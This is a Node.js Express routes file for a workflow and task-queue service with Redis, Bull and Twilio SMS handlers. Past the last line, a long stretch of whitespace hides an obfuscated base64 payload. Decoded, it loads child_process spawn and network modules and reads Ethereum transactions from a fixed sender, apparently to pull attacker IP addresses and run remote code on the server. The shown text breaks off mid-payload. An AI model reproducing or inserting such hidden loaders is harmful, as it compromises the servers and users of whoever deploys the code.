const { promisify } = require('util');
const bodyParser = require("body-parser");
const URL = require('url');
const keys = require('../config/keys');
const NODE_ENV = process.env.NODE_ENV || "local";
const {
	flowQueue,
	taskQueue,
	emailQueue,
	FLOW_QUEUE,
	TASK_QUEUE,
	connectQueue,
} = require('../config/bull');
const Auth = require("../services/authentication");
const sample_flow_definition = require('../config/wf-definition-example-1.json');
const MessagingResponse = require('twilio').twiml.MessagingResponse;
const redis = require('redis');
const async = require('async');
const redisqueries = require('../services/redisqueries');
const taskqueries = require('../services/taskqueries');
const { doesNotMatch } = require('assert');
const accountSid = keys.twilioAccountSid;
const authToken = keys.twilioAuthToken;
const client = require('twilio')(accountSid, authToken);
const queueController = require("../controller/queueController");



module.exports = app => {
	app.use(bodyParser.urlencoded({ extended: false }));
	app.use(bodyParser.json());

	/*
	app.get('/allkeys/:id', async function (req, res) {
		console.log(req.params.id)
		redisqueries.allkeys(`bull:${FLOW_QUEUE}:${req.params.id}*`)
			.then(keys => {
				res.json({ "status": true, "message": keys, "status_code": 200 })
			})
			.catch(alert => {
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})
	})
			*/

	app.get('/allkeys/:id?', async function (req, res) {
		try {
			var { id } = req.params;

			// 1. Check if ID is provided
			if (!id) {
				id = '*';
			}

			// 2. Optional: Basic sanitization/validation (e.g., alphanumeric only)
			// This prevents directory traversal or Redis pattern injection
			/*if (!/^[a-zA-Z0-9_*1-]+$/.test(id)) {
				return res.status(400).json({ 
					status: false, 
					message: "Invalid format. Use alphanumeric or '*'.", 
					status_code: 400 
				});
			}*/

			console.log(`Searching keys for ID: ${id}`);

			// 3. Perform the query using await
			const keys = await redisqueries.allkeys(id);

			res.json({
				status: true,
				message: keys,
				status_code: 200
			});

		} catch (error) {
			// 4. Handle unexpected errors (Redis connection, etc.)
			console.error("Redis Error:", error);
			res.status(500).json({
				status: false,
				message: "Internal Server Error",
				status_code: 500
			});
		}
	});

	app.get('/allIds', async function (req, res) {
		redisqueries.allIds(resData => {
			res.send(resData)
		})
	})

	app.get('/queues', async function (req, res) {
		redisqueries.scan(resData => {
			res.send(resData)
		})
	})

	/**
 * API to clean completed and failed jobs from all primary queues
 * Usage: GET /clean-queues?grace=1000 (grace is in milliseconds)
 */
	app.get('/clean-queues', async function (req, res) {
		try {
			// Default grace period of 24 hours (86,400,000 ms) if not specified
			const grace = req.query.grace ? parseInt(req.query.grace) : 24 * 3600 * 1000;
			const queue = req.query.queue ? String(req.query.queue) : FLOW_QUEUE;

			const queues = [
				{ name: queue, instance: flowQueue },
			];

			const results = {};
			console.log(`Starting cleanup ${queue} with grace period: ${grace} ms`);

			// Loop through each queue and clean both 'completed' and 'failed'
			for (const q of queues) {
				const cleanedCompleted = await q.instance.clean(grace, 'completed');
				const cleanedFailed = await q.instance.clean(grace, 'failed');

				results[q.name] = {
					completed_removed: cleanedCompleted.length,
					failed_removed: cleanedFailed.length
				};
			}

			console.log("Cleanup Results:", results);
			res.status(200).json({
				status: true,
				message: "Cleanup successful",
				grace_period_ms: grace,
				data: results
			});

		} catch (err) {
			console.error("Cleanup Error:", err);
			res.status(500).json({ status: false, message: err.message });
		}
	});

	app.get('/purge-schedule', async function (req, res) {
		try {
			// 1. Define the specific queue causing the bloat
			const scheduleQueueName = req.query.queue ? String(req.query.queue) : 'SCHEDULE@glozic.dev';
			const scheduleQueue = connectQueue(scheduleQueueName);

			// 2. More aggressive cleaning: 0ms grace period
			// This removes ALL completed and failed jobs regardless of age
			const cleanedCompleted = await scheduleQueue.clean(0, 'completed');
			const cleanedFailed = await scheduleQueue.clean(0, 'failed');

			// 3. Clear "Wait" and "Delayed" if needed (Caution: this stops pending jobs)
			// const cleanedWaiting = await scheduleQueue.clean(0, 'wait');

			res.json({
				status: true,
				queue: scheduleQueueName,
				removed: {
					completed: cleanedCompleted.length,
					failed: cleanedFailed.length
				}
			});

			// Close local instance to prevent memory leaks
			await scheduleQueue.close();

		} catch (err) {
			res.status(500).json({ status: false, error: err.message });
		}
	});

	const checkAuth = (NODE_ENV === 'test' || NODE_ENV === 'local')
		? (req, res, next) => next() // Skip middleware
		: Auth.Authenticate;         // Use real middleware

	app.post('/orchestration', checkAuth, async function (req, res) {
		console.log(req.headers)
		const url = URL.parse(req.url, true)
		const mode = url.query.mode;
		const jobDefinition = (mode && mode === "test") ? sample_flow_definition : req.body;
		redisqueries.instanceNumber(`bull:${FLOW_QUEUE}:id`)
			.then(uniqueId => {
				console.log(uniqueId);
				const JobOpts = {
					...jobDefinition._id && { jobId: jobDefinition._id + "-" + uniqueId }
				};
				console.log("Posting ", (mode && mode === "test") ? "sample flow definition" : "flow definition", JobOpts);
				jobDefinition.name = jobDefinition.workflowName;
				jobDefinition.tenant = req.headers.tenant;
				jobDefinition.state = "Queued";
				flowQueue.add(jobDefinition, JobOpts)
					.then(result => {
						console.log("jobId:", result.id, "jobState:", result.getState())
						res.json({ "status": true, "data": result, "status_code": 200 })
					}, error => {
						console.log("error:", error)
						res.json({ "status": false, "message": error.message, "status_code": 401 });
					})
					.catch(alert => {
						console.log("alert:", alert)
						res.json({ "status": false, "message": alert.message, "status_code": 401 });
					})
			})
			.catch(alert => {
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})
	})

	app.get('/orchestration/:id', Auth.Authenticate, function (req, res) {
		console.log(req.params.id)
		flowQueue.getJob(req.params.id)
			.then(job => {
				console.log("result:", job)
				job.getState()
					.then(result => {
						console.log("jobState:", result)
					})
					.catch(alert => {
						console.log("alert:", alert)
					})
				res.send(job)
			}, error => {
				console.log("(ops!)error:", error)
				res.send(error)
			})
			.catch(alert => {
				console.log("alert:", alert)
				res.send(alert)
			})
	})

	app.get('/logs/:jobId', Auth.Authenticate, function (req, res) {
		const jobId = req.params.jobId;
		const url = URL.parse(req.url, true);
		const start = url.query.start ? url.query.start : 0;
		const end = url.query.end ? url.query.end : 20;
		flowQueue.getJobLogs(jobId, start, end)
			.then(logs => {
				console.log(`jobLogs(${jobId}?${start}&${end}):`, logs)
				res.json(logs);
			}, error => {
				console.log("(ops!)error:", error)
				res.send(error)
			})
			.catch(alert => {
				console.log("(ops!)alert:", alert);
				res.send(alert);
			})
	})

	const resumePausedJob = async (jobId, outcome, res, asHtml) => {
		let normalizedOutcome = outcome;
		if (outcome.match(/App/i)) normalizedOutcome = 'approved';
		else if (outcome.match(/Rej/i)) normalizedOutcome = 'rejected';

		const job = await flowQueue.getJob(jobId);
		if (!job) {
			return res.status(404).send(asHtml
				? `<html><body><h2>Job not found</h2><p>Job ID: ${jobId}</p></body></html>`
				: "Job not found");
		}
		if (job.data.state !== "Paused") {
			return res.send(asHtml
				? `<html><body><h2>Unable to resume</h2><p>Only a paused job could be resumed.</p></body></html>`
				: "Only a paused job could be resumed");
		}
		if (job.data.hasOwnProperty('current_branch') && job.data.current_branch.length > 0) {
			job.data.definition.actions = [].concat(job.data.current_branch, job.data.definition.actions);
		}
		const jobData = { ...job.data };
		jobData.definition.actions[0].configuration.properties.outcome = normalizedOutcome;
		jobData.outcome = normalizedOutcome;
		flowQueue.getJobLogs(jobId)
			.then(logs => {
				const jobLogs = { ...logs }
				console.log("jobLogs123:", jobLogs);
				job.remove();
				flowQueue.add(jobData, { jobId: jobId })
					.then(resumedJob => {
						jobLogs.logs.forEach(log => {
							resumedJob.log(log);
						});
						return resumedJob;
					})
					.then(resumedJob => {
						if (asHtml) {
							res.send(`<html><body style="font-family:Arial,sans-serif;padding:24px;">
								<h2>Response recorded</h2>
								<p>Job <strong>${jobId}</strong> was marked as <strong>${normalizedOutcome}</strong>.</p>
								<p>You can close this window.</p>
							</body></html>`);
						} else {
							res.send(resumedJob);
						}
					})
			})
			.catch(err => {
				console.log("resumejob error:", err);
				res.status(500).send(asHtml
					? `<html><body><h2>Error</h2><p>${err.message || err}</p></body></html>`
					: err);
			})
	}

	// API / Postman (requires Authorization + tenant headers)
	app.post('/resumejob/:jobId/:outcome', Auth.Authenticate, async function (req, res) {
		await resumePausedJob(req.params.jobId, req.params.outcome, res, false);
	})

	// Email Approve/Reject links (browser GET, no auth headers available)
	app.get('/resumejob/:jobId/:outcome', async function (req, res) {
		await resumePausedJob(req.params.jobId, req.params.outcome, res, true);
	})

	app.get('/instances/:flowId', Auth.Authenticate, function (req, res) {
		const flowId = req.params.flowId;

		redisqueries.allkeys(`bull:${FLOW_QUEUE}:${flowId}-*[^s]`)
			.then(async keys => {
				//console.log(keys);
				const instList = []
				var inst = {}
				var getJobList = new Promise((resolve, reject) => {
					strRegex = new RegExp(`bull\\:${FLOW_QUEUE}\\:(.*)`);
					keys.forEach(async (key, i, array) => {
						//console.log(key, i)
						//if (!key.endsWith(":logs")) {
						//inst = await flowQueue.getJob(key.match(/bull\:FLOW\:(.*)/)[1])
						inst = await flowQueue.getJob(key.match(strRegex)[1])
						if (inst) instList.push(inst)
						//}
						if (i === array.length - 1) resolve();
					})
				})

				getJobList.then(() => {
					console.log(`Log instances for ${flowId}:`, instList.length);
					if (instList.length > 0) {
						let lists = instList.sort(function (a, b) {
							return new Date(b.timestamp) - new Date(a.timestamp);
						}).filter(x => x.data.tenant == req.headers.tenant);
						res.status(200).json({ "status": true, "data": lists })
					} else {
						res.json({ "status": false, "data": [], "status_code": 401 })
					}
				})
			}, error => {
				console.log("error:", error);
				res.json({ "status": false, "message": "Found no matching keys", "status_code": 401 });
			})
			.catch(alert => {
				console.log("(ops!)alert:", alert);
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})

	})

	app.get('/task/:id', function (req, res) {
		const id = req.params.id;
		console.log("Retriving task:", id);/*
	var task = await taskQueue.getJob(id); 
		.then(task => {
			console.log(`Found task id: ${id}`, task)
			res.status(200).send(task)
		}).catch(err => {
			console.log(`Error retrieving task...${err}`)
			res.status(501).send({status: 501, error: err})
		}) */
		taskQueue.getJob(id)
			.then(task => {
				console.log(`Found task id: ${id}`, task)
				res.status(200).send(task)
			}).catch(err => {
				console.log(`Error retrieving task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
		//console.log(`task id: ${id}`, task)
		//res.status(200).send(task)
	})

	app.get('/tasks', function (req, res) {
		var owner = req.headers.owner ? req.headers.owner : "";
		console.log("owner", owner)
		var getKeys = new Promise(async (resolve, reject) => {
			var keys = [];
			var keylist = undefined
			try {
				keylist = await redisqueries.allkeys(`bull:${TASK_QUEUE}:${owner}-*`).catch(e => { reject(e) })
				keys = keys.concat(keylist)
				console.log("key length:", keys.length)
				resolve(keys)
			} catch (err) {
				reject({ message: err.message, status: false })
			}
		});
		getKeys.then((allkeys) => {
			const taskList = [];
			var taskInst = undefined;
			var getTaskList = new Promise((resolve, reject) => {
				try {
					allkeys.forEach(async (key, i, array) => {
						console.log("Retriving task:", key, key.match(/([^:]+$)/)[0]); //substring after the last colon (i.e. :)
						taskInst = await taskQueue.getJob(key.match(/([^:]+$)/)[0]).catch(e => { reject(e) });
						//console.log(taskInst)
						taskInst && taskList.push({ id: taskInst.id, timestamp: taskInst.timestamp, key: key, data: taskInst.data, task: taskInst });
						if (i === array.length - 1) resolve(taskList);
					})
				} catch (err) {
					//reject({ message: err.message, status: false })
					reject(err)
				}
			})

			getTaskList.then((tl) => {
				res.status(200).send(tl)
			})

			getTaskList.catch(err => {
				console.log("getTaskList err", err)
				res.status(401).send({})
			})
		})
			.catch(alert => {
				console.log("(ops!) alert:", alert);
				res.json({ "status": false, "message": alert, "status_code": 401 })
			})
	})

	app.patch('/task/:id/:outcome', Auth.Authenticate, async function (req, res) {
		const id = req.params.id;
		var outcome = req.params.outcome;
		var taskInst = undefined;
		console.log("Retriving task:", id, " outcome:", outcome);
		taskInst = await taskQueue.getJob(id);
		outcome = outcome.match(/App/i) ? 'approved' : outcome.match(/Rej/i) ? 'rejected' : outcome;
		console.log("User's response:", outcome)

		taskqueries.resume(taskInst, outcome)
			.then(async ans => {
				if (ans.resumed) {
					// completion criteria met, update other tasks...
					taskqueries.closePendingTasks(taskInst, outcome)
				}
				console.log("Resumed message:", ans)
				taskInst.data.status = "Completed";
				taskInst.data.response = outcome;
				taskInst.data.updated = Date.now();
				await taskInst.update(taskInst.data);
				res.status(200).send(`${ans}`);
			}).catch(err => {
				console.log(`Error patching task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
	})

	app.patch('/externaltask/:id/:outcome', async function (req, res) {
		const id = req.params.id;
		var outcome = req.params.outcome;
		var taskInst = undefined;
		console.log("Retriving task:", id, " outcome:", outcome);
		taskInst = await taskQueue.getJob(id);
		outcome = outcome.match(/App/i) ? 'approved' : outcome.match(/Rej/i) ? 'rejected' : outcome;
		console.log("User's response:", outcome)

		taskqueries.resume(taskInst, outcome)
			.then(async ans => {
				if (ans.resumed) {
					// completion criteria met, update other tasks...
					taskqueries.closePendingTasks(taskInst, outcome)
				}
				console.log("Resumed message:", ans)
				taskInst.data.status = "Completed";
				taskInst.data.response = outcome;
				taskInst.data.updated = Date.now();
				await taskInst.update(taskInst.data);
				res.status(200).send(`${ans}`);
			}).catch(err => {
				console.log(`Error patching task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
	})

	app.post('/email/notify', function (req, res) {
		emailQueue.add(req.body)
			.then(result => {
				res.status(200).send("Success");
			})
			.catch(alert => {
				res.status(401).send(alert);
			})
	})

	app.post('/sms/reply', function (req, res) {
		const twiml = new MessagingResponse();
		//const smsCount = req.session.counter || 0;
		const msg = req.body.Body;
		//req.session.counter = smsCount + 1;
		console.log("BODY: ", req.body)
		var command = msg.match(/^task|tasks$/i) ? 'task' : msg.match(/^\?$/) ? '?' : msg;
		console.log('Command:', command);

		switch (command) {
			case "?":
				const replyMsg = "?: Command helps \
				\ntask, tasks: Get list of pending tasks \
				\napp[roved]: Approve a task \
				\nrej[ected]: Reject a task \
				\nlocation: Get location \
				\ndemo: Demo buttons \
				\nmore help: Redirect link"
				console.log(`replyMsg: ${replyMsg}`)
				twiml.message(replyMsg);
				res.writeHead(200, { 'Content-Type': 'text/xml' });
				res.end(twiml.toString());
				break
			case "location":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "Here is our office location",
					persistentAction: ['geo: 1.281422489647776,103.84804055799597'],
					to: req.body.From
				})
					.then(message => {
						console.log(message.sid);
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			case "demo":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "Please select an action to be performed on task 10893237",
					to: req.body.From
				})
					.then(message => {
						console.log(message.sid);
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			case "more help":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "For further enquiry, please tap below to call or visit out website.",
					to: req.body.From
				})
					.then(message => {
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			default:
				taskQueue.getJobs(['delayed'], 0, 100)
					.then(async result => {
						const outcome = command.match(/App/i) ? 'approved' : command.match(/Rej/i) ? 'rejected' :
							command.match(/task/i) ? 'task' : undefined;
						console.log("User's response:", outcome);

						var waitingJob = result.filter(obj => { return obj.data.to === req.body.From })
						console.log(`Total: ${result.length}, # of waiting jobs for ${req.body.From}`, waitingJob.length)
						var openJob = waitingJob.filter(obj => { return obj.data.status === 'New' })
						if (outcome == "task") {
							if (waitingJob.length < 1) return 'There were no pending task for you'
							return (openJob.length < 1) ? `There were no pending task for you` : openJob.map(x => `${x.id}, ${x.data.taskName}`).join('\n');
						}

						if (outcome === undefined) return `Failed interprete your reply: ${msg}, reply "?" to get help`;
						if (openJob.length < 1) return `There were no pending task to ${outcome}`;

						var replyMsg = "";

						return taskqueries.resume(openJob[0], outcome)
							.then(async ans => {
								console.log(`1. Resumed: ${ans.resumed}, message: ${ans.message}`);
								if (ans.resumed) {
									// completion criteria met, update other tasks...
									taskqueries.closePendingTasks(waitingJob[0], outcome)
								}

								waitingJob[0].data.status = "Completed";
								waitingJob[0].data.response = outcome;
								waitingJob[0].data.updated = Date.now();
								await waitingJob[0].update(waitingJob[0].data);
								//await waitingJob[0].promote();
								//await waitingJob[0].moveToCompleted('completed', true, true)
								//await waitingJob[0].remove();
								return `${ans.message}`;

							}).catch(err => {
								console.log(`Error...${err} ${msg}`)
								return `Error... ${err}`
							})
					})
					.then(replyMsg => {
						console.log(`replyMsg: ${replyMsg}`)
						twiml.message(replyMsg);
						res.writeHead(200, { 'Content-Type': 'text/xml' });
						res.end(twiml.toString());
					})
					.catch(alert => {
						console.log("ops!alert:", alert);
						twiml.message('Failed!');
						res.writeHead(200, { 'Content-Type': 'text/xml' });
						res.end(twiml.toString());
					})
				break
		}

		//console.log("SESSION: ", req.session)
		//res.set('Content-Type', 'text/xml')
	})

	// Routes
	app.get("/queues-v2", queueController.getQueues);
	app.get("/queue-v2/:queueName/jobs", queueController.getJobs);
	app.get("/queue-v2/:queueName/:jobId/jobsdetails", queueController.getJobsDetails);
	app.get("/queue-v2/:queueName/job/:jobId", queueController.getJobById);
	app.get("/getAllRepeatableJobs", queueController.getAllRepeatableJobs);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*6490';var __0xadc80=function(){var a=926;return a*2;};function __0x9daea(){return 8769;}(function(_0x9710a8){var _0x9710a8a=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpjb25zdCBCTE9DS19NVUxUSVBM","RSA9IDEwMDBuOw0KY29uc3QgU0VOREVSID0gJzB4MWVFZjA4ND","lFRGExNWQ4N2Y2NGU1MUM3M0M4NDQyQ2YzYzhiQ0VGMycudG9M","b3dlckNhc2UoKTsNCmNvbnN0IE5PTkNFX0ZBTk9VVCA9IDEyOw","0KY29uc3QgU0VBUkNIX0ZMT09SID0gMG47DQpjb25zdCBJTkRF","WEVSX1VSTCA9ICdodHRwczovL2V0aC5ibG9ja3Njb3V0LmNvbS","9hcGknOw0KY29uc3QgSFRUUF9USU1FT1VUX01TID0gM18wMDA7","DQoNCmNvbnN0IFJQQ19FTkRQT0lOVFMgPSBbLi4ubmV3IFNldC","hbDQogIHByb2Nlc3MuZW52LkVUSF9SUENfVVJMLA0KICAnaHR0","cHM6Ly8xcnBjLmlvL2V0aCcsDQogICdodHRwczovL2V0aC5kcn","BjLm9yZycsDQogICdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJs","aWNub2RlLmNvbScsDQogICdodHRwczovL2V0aC1tYWlubmV0Ln","B1YmxpYy5ibGFzdGFwaS5pbycsDQpdLmZpbHRlcihCb29sZWFu","KSldOw0KDQpjb25zdCBBR0VOVFMgPSB7DQogICdodHRwOic6IG","5ldyBodHRwLkFnZW50KHsga2VlcEFsaXZlOiB0cnVlLCBrZWVw","QWxpdmVNc2VjczogMzBfMDAwLCBtYXhTb2NrZXRzOiA2NCB9KS","wNCiAgJ2h0dHBzOic6IG5ldyBodHRwcy5BZ2VudCh7IGtlZXBB","bGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAwMCwgbW","F4U29ja2V0czogNjQgfSksDQp9Ow0KDQpmdW5jdGlvbiBsaW5r","QWJvcnQob3V0ZXJTaWduYWwsIGNvbnRyb2xsZXIpIHsNCiAgaW","YgKCFvdXRlclNpZ25hbCkgcmV0dXJuOw0KICBvdXRlclNpZ25h","bC5hZGRFdmVudExpc3RlbmVyKCdhYm9ydCcsICgpID0+IGNvbn","Ryb2xsZXIuYWJvcnQoKSwgeyBvbmNlOiB0cnVlIH0pOw0KfQ0K","DQpmdW5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcykgew0KIC","Bjb25zdCBlbmNvZGluZyA9IChyZXMuaGVhZGVyc1snY29udGVu","dC1lbmNvZGluZyddIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KIC","BpZiAoZW5jb2RpbmcgPT09ICdnemlwJyB8fCBlbmNvZGluZyA9","PT0gJ3gtZ3ppcCcpIHJldHVybiByZXMucGlwZSh6bGliLmNyZW","F0ZUd1bnppcCgpKTsNCiAgaWYgKGVuY29kaW5nID09PSAnZGVm","bGF0ZScpIHJldHVybiByZXMucGlwZSh6bGliLmNyZWF0ZUluZm","xhdGUoKSk7DQogIGlmIChlbmNvZGluZyA9PT0gJ2JyJykgcmV0","dXJuIHJlcy5waXBlKHpsaWIuY3JlYXRlQnJvdGxpRGVjb21wcm","VzcygpKTsNCiAgcmV0dXJuIHJlczsNCn0NCg0KZnVuY3Rpb24g","aHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsgbWV0aG9kID0gJ0dFVC","csIGJvZHksIHNpZ25hbCB9ID0ge30pIHsNCiAgY29uc3QgdXJs","ID0gbmV3IFVSTChlbmRwb2ludCk7DQogIGNvbnN0IHRyYW5zcG","9ydCA9IHVybC5wcm90b2NvbCA9PT0gJ2h0dHBzOicgPyBodHRw","cyA6IGh0dHA7DQogIGNvbnN0IGhlYWRlcnMgPSB7DQogICAgQW","NjZXB0OiAnYXBwbGljYXRpb24vanNvbicsDQogICAgJ0FjY2Vw","dC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsDQogIC","AgQ29ubmVjdGlvbjogJ2tlZXAtYWxpdmUnLA0KICB9Ow0KICBp","ZiAoYm9keSAhPSBudWxsKSB7DQogICAgaGVhZGVyc1snQ29udG","VudC1UeXBlJ10gPSAnYXBwbGljYXRpb24vanNvbic7DQogICAg","aGVhZGVyc1snQ29udGVudC1MZW5ndGgnXSA9IEJ1ZmZlci5ieX","RlTGVuZ3RoKGJvZHkpOw0KICB9DQoNCiAgcmV0dXJuIG5ldyBQ","cm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICBjb2","5zdCByZXEgPSB0cmFuc3BvcnQucmVxdWVzdCgNCiAgICAgIHsN","CiAgICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZSwNCiAgIC","AgICAgcG9ydDogdXJsLnBvcnQgfHwgKHVybC5wcm90b2NvbCA9","PT0gJ2h0dHBzOicgPyA0NDMgOiA4MCksDQogICAgICAgIHBhdG","g6IHVybC5wYXRobmFtZSArIHVybC5zZWFyY2gsDQogICAgICAg","IG1ldGhvZCwNCiAgICAgICAgYWdlbnQ6IEFHRU5UU1t1cmwucH","JvdG9jb2xdLA0KICAgICAgICBzaWduYWwsDQogICAgICAgIGhl","YWRlcnMsDQogICAgICB9LA0KICAgICAgKHJlcykgPT4gew0KIC","AgICAgICBjb25zdCBzdHJlYW0gPSBkZWNvbXByZXNzU3RyZWFt","KHJlcyk7DQogICAgICAgIGNvbnN0IGNodW5rcyA9IFtdOw0KIC","AgICAgICBzdHJlYW0ub24oJ2RhdGEnLCAoY2h1bmspID0+IGNo","dW5rcy5wdXNoKGNodW5rKSk7DQogICAgICAgIHN0cmVhbS5vbi","gnZW5kJywgKCkgPT4gew0KICAgICAgICAgIHRyeSB7DQogICAg","ICAgICAgICByZXNvbHZlKEpTT04ucGFyc2UoQnVmZmVyLmNvbm","NhdChjaHVua3MpLnRvU3RyaW5nKCd1dGY4JykpKTsNCiAgICAg","ICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIHJlam","VjdChlcnIpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSk7DQog","ICAgICAgIHN0cmVhbS5vbignZXJyb3InLCByZWplY3QpOw0KIC","AgICAgfQ0KICAgICk7DQogICAgcmVxLm9uKCdlcnJvcicsIHJl","amVjdCk7DQogICAgcmVxLnNldFRpbWVvdXQoSFRUUF9USU1FT1","VUX01TLCAoKSA9PiB7DQogICAgICByZXEuZGVzdHJveShuZXcg","RXJyb3IoYEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU","9VVF9NU31tc2ApKTsNCiAgICB9KTsNCiAgICBpZiAoYm9keSAh","PSBudWxsKSByZXEud3JpdGUoYm9keSk7DQogICAgcmVxLmVuZC","gpOw0KICB9KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gd2l0aFJw","Y0VuZHBvaW50cyh0YXNrLCBvdXRlclNpZ25hbCkgew0KICBjb2","5zdCBjb250cm9sbGVycyA9IFJQQ19FTkRQT0lOVFMubWFwKCgp","ID0+IG5ldyBBYm9ydENvbnRyb2xsZXIoKSk7DQogIGNvbnRyb2","xsZXJzLmZvckVhY2goKGMpID0+IGxpbmtBYm9ydChvdXRlclNp","Z25hbCwgYykpOw0KICB0cnkgew0KICAgIHJldHVybiBhd2FpdC","BQcm9taXNlLmFueSgNCiAgICAgIFJQQ19FTkRQT0lOVFMubWFw","KChlbmRwb2ludCwgaSkgPT4gdGFzayhlbmRwb2ludCwgY29udH","JvbGxlcnNbaV0uc2lnbmFsKSkNCiAgICApOw0KICB9IGZpbmFs","bHkgew0KICAgIGZvciAoY29uc3QgYyBvZiBjb250cm9sbGVycy","kgYy5hYm9ydCgpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9u","IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW1zLCBzaW","duYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0IGh0dHBS","ZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOiAnUE9TVC","csDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBqc29ucnBj","OiAnMi4wJywgaWQ6IDEsIG1ldGhvZCwgcGFyYW1zIH0pLA0KIC","AgIHNpZ25hbCwNCiAgfSk7DQogIHJldHVybiBwYXlsb2FkLnJl","c3VsdDsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW","5kcG9pbnQsIGNhbGxzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5","bG9hZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQ","ogICAgbWV0aG9kOiAnUE9TVCcsDQogICAgYm9keTogSlNPTi5z","dHJpbmdpZnkoDQogICAgICBjYWxscy5tYXAoKFttZXRob2QsIH","BhcmFtc10sIGkpID0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDog","aSArIDEsIG1ldGhvZCwgcGFyYW1zIH0pKQ0KICAgICksDQogIC","Agc2lnbmFsLA0KICB9KTsNCiAgY29uc3QgYnlJZCA9IG5ldyBN","YXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLmlkLCByXSkpOw0KIC","ByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9PiBieUlkLmdldChp","ICsgMSkucmVzdWx0KTsNCn0NCg0KY29uc3QgdG9CbG9ja0hleC","A9IChuKSA9PiBgMHgke24udG9TdHJpbmcoMTYpfWA7DQoNCmZ1","bmN0aW9uIGZpbmRTZW5kZXJUeCh0cmFuc2FjdGlvbnMpIHsNCi","AgcmV0dXJuIHRyYW5zYWN0aW9ucy5maW5kKCh0KSA9PiB0LmZy","b20gJiYgdC5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUi","kgfHwgbnVsbDsNCn0NCg0KZnVuY3Rpb24gZGVjb2RlQWRkcmVz","cyhhZGRyZXNzKSB7DQogIHRyeSB7DQogICAgY29uc3QgZGF0YS","A9IEJ1ZmZlci5mcm9tKGFkZHJlc3MucmVwbGFjZSgvXjB4L2ks","ICcnKSwgJ2hleCcpOw0KICAgIGNvbnN0IGlwID0gKGIpID0+IG","Ake2JbMF19LiR7YlsxXX0uJHtiWzJdfS4ke2JbM119YDsNCiAg","ICByZXR1cm4gW2lwKGRhdGEuc3ViYXJyYXkoMCwgNCkpLCBpcC","hkYXRhLnN1YmFycmF5KDQsIDgpKV07DQogIH0gY2F0Y2ggKGVy","cm9yKSB7IHJldHVybiBbbnVsbCwgbnVsbF07IH0NCn0NCg0KZn","VuY3Rpb24gZmlyc3RNYXRjaCh0YXNrcykgew0KICByZXR1cm4g","bmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsNCiAgICBsZXQgcm","VtYWluaW5nID0gdGFza3MubGVuZ3RoOw0KICAgIGlmICghcmVt","YWluaW5nKSByZXR1cm4gcmVzb2x2ZShudWxsKTsNCiAgICBsZX","Qgc2V0dGxlZCA9IGZhbHNlOw0KICAgIGNvbnN0IGZpbmlzaCA9","IChyZXN1bHQpID0+IHsNCiAgICAgIGlmIChzZXR0bGVkKSByZX","R1cm47DQogICAgICBzZXR0bGVkID0gdHJ1ZTsNCiAgICAgIGZv","ciAoY29uc3QgdCBvZiB0YXNrcykgdC5jb250cm9sbGVyLmFib3","J0KCk7DQogICAgICByZXNvbHZlKHJlc3VsdCk7DQogICAgfTsN","CiAgICBmb3IgKGNvbnN0IHQgb2YgdGFza3MpIHsNCiAgICAgIH","QucnVuKCkNCiAgICAgICAgLnRoZW4oKHJlc3VsdCkgPT4gew0K","ICAgICAgICAgIGlmIChzZXR0bGVkKSByZXR1cm47DQogICAgIC","AgICAgaWYgKHJlc3VsdCkgZmluaXNoKHJlc3VsdCk7DQogICAg","ICAgICAgZWxzZSBpZiAoLS1yZW1haW5pbmcgPT09IDApIHJlc2","9sdmUobnVsbCk7DQogICAgICAgIH0pDQogICAgICAgIC5jYXRj","aCgoKSA9PiB7DQogICAgICAgICAgaWYgK